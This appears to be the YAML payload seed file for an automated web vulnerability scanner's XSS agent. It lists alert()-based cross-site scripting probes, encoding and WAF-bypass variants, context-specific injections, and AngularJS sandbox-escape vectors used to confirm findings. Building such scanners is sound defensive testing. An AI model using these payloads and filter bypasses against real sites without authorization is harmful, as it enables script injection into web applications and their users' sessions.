# XSS payloads — seed list for the XSS agent
# The LLM mutator generates additional variants and bypasses based on observed responses.
#
# Categories:
#   basic      — standard probes, highest detection rate against unprotected targets
#   obfuscation — encoding/casing tricks to bypass simple string matching
#   bypass     — WAF and filter evasion techniques
#   dom        — payloads targeting client-side sinks (innerHTML, document.write, eval)
#   blind      — payloads for stored/blind XSS where the sink is on a different page

payloads:
  basic:
    - '<img src=x onerror=alert(1)>'
    - '"><script>alert(1)</script>'
    - "';alert(1)//"
    - '<svg onload=alert(1)>'
    - '<body onload=alert(1)>'
    - '"><img src=x onerror=alert(1)>'

  obfuscation:
    - '<ScRiPt>alert(1)</ScRiPt>'
    - '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>'
    - '<svg/onload=alert(1)>'
    - '"><svg onload=alert&#40;1&#41;>'
    - '<img src=x onerror=alert(1)>'
    - "javascript:alert`1`"
    - '<iframe src=javascript:alert(1)>'

  bypass:
    - '<img src=x oNeRrOr=alert(1)>'
    - '<<script>alert(1)//<</script>'
    - '<script>alert(String.fromCharCode(88,83,83))</script>'
    - '" autofocus onfocus=alert(1) x="'
    - "' autofocus onfocus=alert(1) x='"
    - '<details open ontoggle=alert(1)>'
    - '<input onfocus=alert(1) autofocus>'
    - '<!--<img src=x onerror=alert(1)>-->'
    - '<xss onmouseover=alert(1)>hover</xss>'
    # DOM nesting bypass (select > button > noscript chain)
    - '<select><button><noscript><selectedcontent></selectedcontent></noscript></button><option><style></noscript><img src=x onerror=alert(1)></style></option></select>'
    # null-byte prefix to bypass sanitizer
    - '<%00><script>alert(1)</script>'
    # encoded null-byte + details/ontoggle
    - '<%001%5c%2a<script%2fx><details/open ontoggle=alert(1)>'

  dom:
    - 'javascript:alert(document.domain)'
    - '#"><img src=x onerror=alert(1)>'
    - 'data:text/html,<script>alert(1)</script>'

  blind:
    # These use a unique marker so the browser validator can detect execution
    # even when the sink is on a different page (stored XSS)
    - '<img src=x onerror=alert("DAST_XSS_CONFIRM")>'
    - '<script>alert("DAST_XSS_CONFIRM")</script>'
    - '<svg onload=alert("DAST_XSS_CONFIRM")>'

# Confirmation marker injected into blind payloads — browser validator looks for this
confirm_marker: "DAST_XSS_CONFIRM"

# ── Deterministic xss_probe context library (read via get_value("xss", ...)) ──
# The xss_probe tool self-detects the reflection CONTEXT (where the marker landed in the
# rendered DOM) and picks the context-correct payload from here, delivering it through the
# real agent browser and confirming strictly via a captured alert() dialog.
#
# {MARK} is a unique per-RUN numeric token the tool substitutes into every context_payloads
# entry before delivery. CONFIRMED requires the captured dialog message to CONTAIN that exact
# {MARK} value — a stray/ambient alert cannot satisfy it, so there are no false positives.
# The *_quote_free sibling is selected when the app HTML-encodes quotes near the reflection
# (so a payload that needs a raw " or ' would be neutralised); those vectors avoid quotes
# entirely (String.fromCharCode / /XSS/.source).
context_payloads:
  html_body:
    - '<img src=x onerror=alert({MARK})>'
    - '<svg onload=alert({MARK})>'
  attr_double_quote:
    - '"><img src=x onerror=alert({MARK})>'
    - '" autofocus onfocus=alert({MARK}) x="'
  attr_single_quote:
    - "'><img src=x onerror=alert({MARK})>"
    - "' autofocus onfocus=alert({MARK}) x='"
  js_string_double:
    - '";alert({MARK})//'
    - '</script><img src=x onerror=alert({MARK})>'
  js_string_single:
    - "';alert({MARK})//"
  href_js:
    - 'javascript:alert({MARK})'
  html_body_quote_free:
    - '<img src=x onerror=alert(String.fromCharCode(88))>'
    - '<svg onload=alert(/XSS/.source)>'

# AngularJS client-side template injection (CSTI) sandbox-escape vectors, keyed by the AngularJS
# ERA detected on the page (1.2 / 1.3 / 1.4 / 1.5, and no_sandbox for 1.0-1.1 and 1.6+ where the
# expression sandbox was absent or removed). These are FIXED published cheat-sheet forms that call
# a literal alert(1) — the sandbox escape itself is structural and cannot be re-parameterised with
# {MARK}, so the tool still confirms via a fired dialog whose message is "1". If a lab fails,
# re-verify the vector against the current PortSwigger / AngularJS CSTI cheat sheet for that era.
angular_csti:
  no_sandbox:
    - '{{constructor.constructor("alert(1)")()}}'
  "1.2":
    - '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}'
  "1.3":
    - '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}'
  "1.4":
    - '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}'
  "1.5":
    - "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"

# AngularJS CSTI variant for the "$parse of a param KEY" sandbox-escape — no string literal in the
# injected payload (it builds "x=alert(1)" via fromCharCode on its char codes). The lab client does
# `key=<paramName>; $scope.query[key]=<paramValue>; $scope.value=$parse(key)($scope.query)`, so the
# param NAME is the Angular expression that gets evaluated. These vectors are therefore delivered by
# xss_probe AS A QUERY-PARAM KEY, not a value (see _build_angular_key_url in xss_probe_tools.py):
#   GET <path>?<injected_param>=1&<EXPR_AS_KEY>=1
# The stored vector is the bare expression WITH its trailing `=1` (the KEY→value separator) but
# WITHOUT the `<injected_param>=1&` prefix and WITHOUT %3d encoding. At delivery the tool prefixes
# `<param>=1&` and percent-encodes every INTERNAL `=` (e.g. the `charAt=` assignment) to `%3d` so it
# stays inside the KEY, keeping the final `=1` as the separator and everything else RAW. Fully
# delivered, the "1.4" vector becomes:
#   ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
# Keyed by era like angular_csti. (Keep storing the bare expression; one entry serves both the
# value-delivery $parse-sink path and the key-delivery path.)
angular_no_strings:
  "1.4":
    - 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1'

# Primitive building blocks for the DETERMINISTIC in-tool CSTI synthesizer
# (dast/triage/xss_synthesis.py). These are the DECOMPOSED pieces of the full angular_csti /
# angular_no_strings vectors above: instead of selecting a canned payload, xss_probe assembles the
# sandbox escape from these primitives and verifies each piece against the live target's own
# $parse/$eval (an oracle) before the terminal confirm — no LLM, no gateway. The curated full
# payloads above stay as the fast first-attempt seed; synthesis is a fallback that runs only after
# every curated candidate misses. KEEP these in sync with the full vectors (same grammar).
#   string_builder   fromCharCode(<codes>) reached via toString().constructor → a string w/o literal
#   charat_override  swaps String.prototype.charAt for Array.join (defeats the sandbox string check)
#   orderby_trigger  evaluates {EXPR} as the orderBy predicate (reaches the sandboxed evaluator)
#   function_ctor    Function-constructor code exec (no-sandbox eras 1.0-1.1 / 1.6+ only)
#   effect_template  the assignment the orderBy trigger evaluates (x=<effect>)
#   key_suffix       trailing KEY→value separator appended for query-param-KEY delivery
angular_primitives:
  string_builder: 'toString().constructor.fromCharCode'
  charat_override: 'toString().constructor.prototype.charAt=[].join'
  orderby_trigger: '[1]|orderBy:{EXPR}'
  function_ctor: 'constructor.constructor({CODE})()'
  effect_template: 'x={EFFECT}'
  key_suffix: '=1'
